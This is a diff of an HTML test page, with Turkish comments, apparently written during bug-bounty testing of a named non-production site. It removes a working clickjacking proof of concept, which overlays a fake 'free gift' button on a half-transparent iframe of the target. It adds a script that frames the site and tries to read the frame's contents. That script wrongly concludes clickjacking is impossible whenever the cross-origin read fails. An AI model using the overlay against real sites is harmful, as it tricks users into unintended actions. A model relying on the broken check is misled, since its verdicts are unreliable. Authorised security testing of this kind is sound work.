@@ -1,57 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Clickjacking PoC</title>
-    <style>
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.5;
-            border: none;
-            z-index: 1;
-        }
-        .fake-button {
-            position: absolute;
-            top: 150px;
-            left: 150px;
-            padding: 30px 60px;
-            background: linear-gradient(45deg, #ff0000, #ff8800);
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            border-radius: 15px;
-            cursor: pointer;
-            z-index: 2;
-            box-shadow: 5px 5px 15px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-        .fake-button:hover {
-            background: linear-gradient(45deg, #ff8800, #ff0000);
-            transform: scale(1.05);
-        }
-        .warning {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: yellow;
-            padding: 10px;
-            z-index: 3;
-            font-weight: bold;
-        }
-    </style>
+    <title>Iframe Yükleme Testi</title>
 </head>
 <body>
-    <div class="warning">DEMO: Bu buton aslında iframe'deki gerçek butonun üzerinde!</div>
-    <div class="fake-button" onclick="alert('Kullanıcı kandırıldı! İşlem yapıldı.')">
-        🎁 BEDAVA HEDİYE KAZAN!<br>
-        <small>(Hemen tıkla!)</small>
-    </div>
+    <h2>Iframe Yükleniyor mu?</h2>
+    <iframe id="testFrame" src="https://uat-bugbounty.nonprod.syfe.com/" 
+            width="800" height="400" 
+            style="border: 3px solid red;"></iframe>
     
-    <!-- İlk endpoint'i test et -->
-    <iframe src="https://uat-bugbounty.nonprod.syfe.com/"></iframe>
-    <!-- Veya ikinci endpoint'i dene -->
+    <script>
+        setTimeout(() => {
+            const frame = document.getElementById('testFrame');
+            const iframeWindow = frame.contentWindow;
+            
+            console.log("Iframe window:", iframeWindow);
+            
+            try {
+                // Iframe içeriğine erişmeye çalış
+                const iframeDoc = frame.contentDocument || iframeWindow.document;
+                console.log("Iframe document:", iframeDoc);
+                console.log("Iframe title:", iframeDoc.title);
+                console.log("Iframe URL:", iframeWindow.location.href);
+                
+                if (iframeDoc && iframeDoc.body) {
+                    document.body.innerHTML += '<h3 style="color:green">✅ Iframe YÜKLENDİ!</h3>';
+                    document.body.innerHTML += '<p>Clickjacking MÜMKÜN olabilir.</p>';
+                }
+            } catch (e) {
+                console.error("Hata:", e.message);
+                document.body.innerHTML += '<h3 style="color:red">❌ Iframe YÜKLENMEDİ!</h3>';
+                document.body.innerHTML += '<p>Hata: ' + e.message + '</p>';
+                document.body.innerHTML += '<p>Clickjacking MÜMKÜN DEĞİL.</p>';
+            }
+        }, 3000);
+    </script>
 </body>
 </html>
